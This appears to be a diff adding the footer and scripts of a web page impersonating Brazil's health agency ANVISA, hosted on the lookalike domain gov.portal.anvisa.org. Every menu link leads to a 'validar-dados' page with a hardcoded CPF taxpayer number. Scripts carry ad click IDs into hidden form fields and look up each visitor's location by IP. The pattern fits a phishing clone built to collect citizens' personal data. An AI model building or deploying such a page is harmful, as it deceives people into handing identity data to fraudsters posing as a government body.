+      <div class="flex items-center justify-between pt-[8px] pl-[4px] pb-[8px] cursor-pointer accordion-trigger" onclick="toggleAccordion(&#39;mais-info&#39;)">
+        <span class="font-bold text-base hover:text-gray-300 transition-colors">MAIS INFORMAÇÕES</span>
+        <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300 mr-1" id="chevron-mais-info"></i>
+      </div>
+      <div class="accordion-content pb-4 hidden" id="content-mais-info">
+        <ul class="space-y-2.5 text-base">
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;vigilancia-sanitaria&#39;)">
+              <span class="text-gray-300">Vigilância Sanitária no Brasil</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-vigilancia-sanitaria"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-vigilancia-sanitaria">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">História da ANVISA</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Marco Regulatório</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Competências</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;medicamentos-anvisa&#39;)">
+              <span class="text-gray-300">Registro de Medicamentos</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-medicamentos-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-medicamentos-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Como Registrar</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Documentação Necessária</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Taxas e Prazos</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;seguranca-alimentar&#39;)">
+              <span class="text-gray-300">Segurança Alimentar</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-seguranca-alimentar"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-seguranca-alimentar">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Normas Sanitárias</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Boas Práticas</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Fiscalização</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;produtos-saude&#39;)">
+              <span class="text-gray-300">Produtos para Saúde</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-produtos-saude"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-produtos-saude">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Dispositivos Médicos</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Equipamentos</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Certificação</a></div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- SERVIÇOS Section -->
+    <div class="border-t border-[#bfcbe2] mt-2"></div>
+    <div class="accordion-item">
+      <div class="flex items-center justify-between pt-[8px] pl-[4px] pb-[8px] cursor-pointer accordion-trigger" onclick="toggleAccordion(&#39;servicos&#39;)">
+        <span class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">SERVIÇOS</span>
+        <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300 mr-1" id="chevron-servicos"></i>
+      </div>
+      <div class="accordion-content pb-4 hidden" id="content-servicos">
+        <ul class="space-y-2.5 text-base">
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;peticionamento&#39;)">
+              <span class="text-gray-300">Peticionamento Eletrônico</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-peticionamento"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-peticionamento">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Cadastro de Empresa</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Protocolos</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Acompanhamento</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;consultas-publicas&#39;)">
+              <span class="text-gray-300">Consultas Públicas</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-consultas-publicas"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-consultas-publicas">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Em Andamento</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Encerradas</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Como Participar</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;farmacovigilancia&#39;)">
+              <span class="text-gray-300">Farmacovigilância</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-farmacovigilancia"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-farmacovigilancia">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Notificar Evento Adverso</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Boletins</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Sistema NOTIVISA</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;banco-preco&#39;)">
+              <span class="text-gray-300">Banco de Preços</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-banco-preco"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-banco-preco">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Consultar Preços</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Medicamentos</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Lista de Conformidade</a></div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- CANAIS DE ATENDIMENTO Section -->
+    <div class="border-t border-[#bfcbe2] mt-2"></div>
+    <div class="accordion-item">
+      <div class="flex items-center justify-between pt-[8px] pl-[4px] pb-[8px] cursor-pointer accordion-trigger" onclick="toggleAccordion(&#39;atendimento&#39;)">
+        <span class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">CANAIS DE ATENDIMENTO</span>
+        <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300 mr-1" id="chevron-atendimento"></i>
+      </div>
+      <div class="accordion-content pb-4 hidden" id="content-atendimento">
+        <ul class="space-y-2.5 text-base">
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;ouvidoria-anvisa&#39;)">
+              <span class="text-gray-300">Ouvidoria</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-ouvidoria-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-ouvidoria-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Denúncias</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Sugestões</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Elogios</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;atendimento-telefonico&#39;)">
+              <span class="text-gray-300">Atendimento Telefônico</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-atendimento-telefonico"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-atendimento-telefonico">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Central 0800</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Horários de Atendimento</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">FAQ</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;contato-anvisa&#39;)">
+              <span class="text-gray-300">Fale com a ANVISA</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-contato-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-contato-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Formulário de Contato</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Endereços das Sedes</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">E-mail Institucional</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;transparencia-anvisa&#39;)">
+              <span class="text-gray-300">Transparência</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-transparencia-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-transparencia-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Portal da Transparência</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Dados Abertos</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">LAI - Lei de Acesso</a></div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- PRIVACIDADE Section -->
+    <div class="border-t border-[#bfcbe2] mt-2"></div>
+    <div class="accordion-item">
+      <div class="flex items-center justify-between pt-[8px] pl-[4px] pb-[8px] cursor-pointer accordion-trigger" onclick="toggleAccordion(&#39;privacidade&#39;)">
+        <span class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">PRIVACIDADE</span>
+        <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300 mr-1" id="chevron-privacidade"></i>
+      </div>
+      <div class="accordion-content pb-4 hidden" id="content-privacidade">
+        <ul class="space-y-2.5 text-base">
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;politica-privacidade-anvisa&#39;)">
+              <span class="text-gray-300">Política de Privacidade</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-politica-privacidade-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-politica-privacidade-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Coleta de Dados</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Uso da Informação</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Direitos do Usuário</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;termos-uso-anvisa&#39;)">
+              <span class="text-gray-300">Termos de Uso</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-termos-uso-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-termos-uso-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Condições Gerais</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Responsabilidades</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Limitações</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;cookies-anvisa&#39;)">
+              <span class="text-gray-300">Cookies</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-cookies-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-cookies-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Configurações</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Tipos de Cookies</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Gerenciar Preferências</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;lgpd-anvisa&#39;)">
+              <span class="text-gray-300">LGPD</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-lgpd-anvisa"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-lgpd-anvisa">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Proteção de Dados</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Direitos dos Titulares</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Encarregado de Dados</a></div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ÓRGÃOS DO GOVERNO Section -->
+    <div class="border-t border-[#bfcbe2] mt-2"></div>
+    <div class="accordion-item">
+      <div class="flex items-center justify-between pt-[8px] pl-[4px] pb-[8px] cursor-pointer accordion-trigger" onclick="toggleAccordion(&#39;orgaos-governo&#39;)">
+        <span class="font-bold text-base tracking-tight hover:text-gray-300 transition-colors">ÓRGÃOS DO GOVERNO</span>
+        <i class="fas fa-chevron-down text-lg accordion-chevron transition-transform duration-300 mr-1" id="chevron-orgaos-governo"></i>
+      </div>
+      <div class="accordion-content pb-4 hidden" id="content-orgaos-governo">
+        <ul class="space-y-2.5 text-base">
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;ministerio-saude&#39;)">
+              <span class="text-gray-300">Ministério da Saúde</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-ministerio-saude"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-ministerio-saude">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">SUS</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Secretarias</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Programas</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;agencias-reguladoras&#39;)">
+              <span class="text-gray-300">Agências Reguladoras</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-agencias-reguladoras"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-agencias-reguladoras">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">ANS</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">ANEEL</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">ANAC</a></div>
+            </div>
+          </li>
+          <li>
+            <div class="flex items-center justify-between cursor-pointer hover:text-white transition-colors" onclick="toggleSubMenu(&#39;outros-orgaos&#39;)">
+              <span class="text-gray-300">Outros Órgãos</span>
+              <i class="fas fa-chevron-down text-sm transition-transform duration-300" id="chevron-outros-orgaos"></i>
+            </div>
+            <div class="ml-4 mt-2 space-y-1 hidden" id="submenu-outros-orgaos">
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Presidência da República</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">Casa Civil</a></div>
+              <div><a href="https://gov.portal.anvisa.org/validar-dados?cpf=69671831800#" class="text-gray-400 hover:text-white transition-colors text-sm">CGU</a></div>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Footer Bottom -->
+    <div class="border-t border-[#bfcbe2] mt-6 pt-6">
+      <div class="text-center text-gray-400 text-sm">
+        <p>© 2025 Agência Nacional de Vigilância Sanitária - ANVISA</p>
+        <p class="mt-2">Todos os direitos reservados</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  let openAccordions = [];
+  let openSubMenus = [];
+  
+  window.toggleAccordion = function(target) {
+    const content = document.getElementById('content-' + target);
+    const chevron = document.getElementById('chevron-' + target);
+    
+    if (openAccordions.includes(target)) {
+      // Fechar
+      content.classList.add('hidden');
+      chevron.classList.remove('rotate-180');
+      openAccordions = openAccordions.filter(item => item !== target);
+    } else {
+      // Abrir
+      content.classList.remove('hidden');
+      chevron.classList.add('rotate-180');
+      openAccordions.push(target);
+    }
+  };
+  
+  window.toggleSubMenu = function(target) {
+    const submenu = document.getElementById('submenu-' + target);
+    const chevron = document.getElementById('chevron-' + target);
+    
+    if (openSubMenus.includes(target)) {
+      // Fechar
+      submenu.classList.add('hidden');
+      chevron.classList.remove('rotate-180');
+      openSubMenus = openSubMenus.filter(item => item !== target);
+    } else {
+      // Abrir
+      submenu.classList.remove('hidden');
+      chevron.classList.add('rotate-180');
+      openSubMenus.push(target);
+    }
+  };
+});
+</script> 
+        
+        <!-- Script para preservar parâmetros UTM em todas as navegações -->
+        <script>
+            (function () {
+                // Função para obter parâmetros UTM da URL atual
+                function getUtmParamsFromUrl() {
+                    const urlParams = new URLSearchParams(
+                        window.location.search,
+                    );
+                    const utmParams = {};
+
+                    // Lista de parâmetros UTM a serem preservados
+                    const utmKeys = [
+                        "utm_source",
+                        "utm_medium",
+                        "utm_campaign",
+                        "utm_content",
+                        "utm_term",
+                        "fbclid",
+                        "gclid",
+                        "ttclid",
+                        "src",
+                        "sck",
+                        "xcod",
+                    ];
+
+                    // Coletar parâmetros UTM presentes na URL
+                    utmKeys.forEach((key) => {
+                        if (urlParams.has(key)) {
+                            utmParams[key] = urlParams.get(key);
+                        }
+                    });
+
+                    return utmParams;
+                }
+
+                // Função para salvar parâmetros UTM no localStorage
+                function saveUtmParamsToStorage(params) {
+                    if (Object.keys(params).length > 0) {
+                        localStorage.setItem(
+                            "utm_params",
+                            JSON.stringify(params),
+                        );
+                        console.log("UTM params saved to storage:", params);
+                    }
+                }
+
+                // Função para obter parâmetros UTM do localStorage
+                function getUtmParamsFromStorage() {
+                    const storedParams = localStorage.getItem("utm_params");
+                    return storedParams ? JSON.parse(storedParams) : {};
+                }
+
+                // Função para adicionar parâmetros UTM a links internos
+                function addUtmParamsToLinks(params) {
+                    if (Object.keys(params).length === 0) return;
+
+                    // Selecionar todos os links internos
+                    const links = document.querySelectorAll("a");
+
+                    links.forEach((link) => {
+                        try {
+                            // Ignorar links externos, âncoras vazias ou links de telefone/email
+                            if (
+                                !link.href ||
+                                link.href.startsWith("tel:") ||
+                                link.href.startsWith("mailto:") ||
+                                link.getAttribute("href") === "#" ||
+                                (link.href.indexOf("//") !== -1 &&
+                                    link.href.indexOf(window.location.host) ===
+                                        -1)
+                            ) {
+                                return;
+                            }
+
+                            // Criar URL a partir do href
+                            const url = new URL(link.href);
+
+                            // Verificar se é um link interno
+                            if (url.host === window.location.host) {
+                                // Adicionar parâmetros UTM
+                                const searchParams = new URLSearchParams(
+                                    url.search,
+                                );
+
+                                // Adicionar apenas parâmetros que não existem já na URL
+                                Object.entries(params).forEach(
+                                    ([key, value]) => {
+                                        if (!searchParams.has(key)) {
+                                            searchParams.set(key, value);
+                                        }
+                                    },
+                                );
+
+                                // Atualizar a URL do link
+                                url.search = searchParams.toString();
+                                link.href = url.toString();
+                            }
+                        } catch (e) {
+                            console.error(
+                                "Error processing link:",
+                                link.href,
+                                e,
+                            );
+                        }
+                    });
+                }
+
+                // Função para adicionar parâmetros UTM a formulários
+                function addUtmParamsToForms(params) {
+                    if (Object.keys(params).length === 0) return;
+
+                    // Selecionar todos os formulários
+                    const forms = document.querySelectorAll("form");
+
+                    forms.forEach((form) => {
+                        // Adicionar campos hidden para cada parâmetro UTM
+                        Object.entries(params).forEach(([key, value]) => {
+                            // Verificar se o campo já existe
+                            const existingField = form.querySelector(
+                                `input[name="${key}"]`,
+                            );
+
+                            if (!existingField) {
+                                const hiddenField =
+                                    document.createElement("input");
+                                hiddenField.type = "hidden";
+                                hiddenField.name = key;
+                                hiddenField.value = value;
+                                form.appendChild(hiddenField);
+                            }
+                        });
+                    });
+                }
+
+                // Inicialização
+                document.addEventListener("DOMContentLoaded", function () {
+                    // Obter parâmetros UTM da URL atual
+                    const urlUtmParams = getUtmParamsFromUrl();
+
+                    // Obter parâmetros UTM armazenados
+                    const storedUtmParams = getUtmParamsFromStorage();
+
+                    // Combinar parâmetros, priorizando os da URL atual
+                    const combinedParams = {
+                        ...storedUtmParams,
+                        ...urlUtmParams,
+                    };
+
+                    // Salvar parâmetros UTM combinados
+                    saveUtmParamsToStorage(combinedParams);
+
+                    // Aplicar parâmetros UTM aos links e formulários
+                    addUtmParamsToLinks(combinedParams);
+                    addUtmParamsToForms(combinedParams);
+
+                    // Adicionar observer para modificações no DOM
+                    const observer = new MutationObserver(function (mutations) {
+                        addUtmParamsToLinks(combinedParams);
+                        addUtmParamsToForms(combinedParams);
+                    });
+
+                    // Configuração do observer (observar mudanças em childList e subtree)
+                    observer.observe(document.body, {
+                        childList: true,
+                        subtree: true,
+                    });
+
+                    console.log("UTM parameter preservation initialized");
+
+                    // Log detalhado para debug do rastreamento de UTM
+                    console.log(
+                        "[UTM TRACKER] Sistema de preservação de UTM inicializado",
+                    );
+                    console.log(
+                        "[UTM TRACKER] UTMs da URL atual:",
+                        getUtmParamsFromUrl(),
+                    );
+                    console.log(
+                        "[UTM TRACKER] UTMs armazenados:",
+                        getUtmParamsFromStorage(),
+                    );
+                });
+            })();
+        </script>
+        <!-- Script de geolocalização automática -->
+        <script>
+            (function() {
+                console.log('[IpFarmacias] Verificando dados de localização...');
+
+                // Verificar se já existe locationData no localStorage
+                const pharmaLocation = localStorage.getItem('pharmaIpData');
+
+                if (pharmaLocation) {
+                    console.log('[IpFarmacias] Dados de farmacias já existem:', pharmaLocation);
+                    return;
+                }
+
+                console.log('[IpFarmacias] Dados não encontrados. Fazendo requisição para /api/farmacias-por-ip...');
+
+                // Fazer requisição para a API de geolocalização
+                fetch('/api/farmacias-por-ip')
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Erro na resposta da API: ' + response.status);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('[IpFarmacias] Dados recebidos da API:', data);
+
+                        // Salvar no localStorage
+                        localStorage.setItem('pharmaIpData', JSON.stringify(data.data));
+                        console.log('[IpFarmacias] Dados salvos no localStorage com sucesso');
+
+                        // Disparar evento customizado para outras partes da página saberem que os dados estão disponíveis
+                        window.dispatchEvent(new CustomEvent('locationDataLoaded', { detail: data }));
+                    })
+                    .catch(error => {
+                        console.error('[IpFarmacias] Erro ao obter dados de localização:', error);
+                    });
+            })();
+        </script>
+        
+        <!-- Script de geolocalização automática -->
+        <script>
+            (function() {
+                console.log('[GeoLocation] Verificando dados de localização...');
+                
+                // Verificar se já existe locationData no localStorage
+                const existingLocation = localStorage.getItem('locationData');
+                
+                if (existingLocation) {
+                    console.log('[GeoLocation] Dados de localização já existem:', existingLocation);
+                    return;
+                }
+                
+                console.log('[GeoLocation] Dados não encontrados. Fazendo requisição para /api/ip-geo...');
+                
+                // Fazer requisição para a API de geolocalização
+                fetch('/api/ip-geo')
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Erro na resposta da API: ' + response.status);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('[GeoLocation] Dados recebidos da API:', data);
+                        
+                        // Salvar no localStorage
+                        localStorage.setItem('locationData', JSON.stringify(data));
+                        console.log('[GeoLocation] Dados salvos no localStorage com sucesso');
+                        
+                        // Disparar evento customizado para outras partes da página saberem que os dados estão disponíveis
+                        window.dispatchEvent(new CustomEvent('locationDataLoaded', { detail: data }));
+                    })
+                    .catch(error => {
+                        console.error('[GeoLocation] Erro ao obter dados de localização:', error);
+                    });
+            })();
+        </script>
+    
+</body></html>
